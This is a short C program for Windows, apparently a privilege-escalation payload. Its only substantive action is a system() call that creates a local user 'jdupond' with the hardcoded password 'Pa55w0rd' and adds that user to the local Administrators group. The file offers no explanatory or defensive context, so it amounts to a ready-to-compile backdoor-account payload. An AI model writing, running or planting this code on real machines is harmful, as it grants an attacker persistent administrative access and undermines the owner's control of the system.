#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

int main(void)
{
  printf("adding user 'jdupond' as local admin\n");
  system("cmd.exe /c net user jdupond Pa55w0rd /add && net localgroup administrators jdupond /add");
  return 0;
}